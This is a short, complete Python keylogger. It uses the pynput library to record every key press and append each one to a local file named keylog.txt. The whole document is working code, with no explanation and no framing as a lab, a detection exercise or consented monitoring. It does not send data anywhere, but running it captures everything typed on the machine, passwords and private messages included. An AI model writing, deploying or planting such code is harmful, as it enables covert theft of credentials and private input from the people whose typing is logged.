from pynput.keyboard import Listener

# file to store keystrokes
log_file = "keylog.txt"

# function to log key presses
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")  # Write key to file
    except Exception as e:
        print(f"Error: {e}")

# start listening 
with Listener(on_press=on_press) as listener:
    listener.join()
